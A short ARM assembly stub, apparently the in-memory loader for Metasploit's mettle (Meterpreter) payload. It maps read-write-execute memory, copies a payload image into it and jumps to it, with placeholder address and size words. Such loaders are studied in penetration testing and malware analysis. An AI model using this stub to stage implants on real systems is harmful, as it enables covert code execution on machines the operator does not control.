
start:
  // mmap the space for the mettle image
  mov r0, #0      // address doesn't matter
  ldr r2, =size
  str r1, [r2], #0
  mov r2, #7      // PROT_READ | PROT_WRITE | PROT_EXECUTE
  mov r3, #34     // MAP_PRIVATE | MAP_ANONYMOUS
  mov r4, #0      // no file
  mov r5, #0      // no offset

  mov r7, #192    // syscall: mmap2
  svc #0

  mov r4, r0
  mov r2, r1
  ldr r3, =address
  str r1, [r3], #0

copyloop:
  ldr r3, [r1], #0
  str r3, [r0], #0
  add r1, r1, #4
  add r0, r0, #4
  sub r2, r2, #4
  cmp r2, #1
  bge copyloop
  bx r4

.balign 16
address:
  .word 0xdeadc0de
size:
  .word 0xdead515e

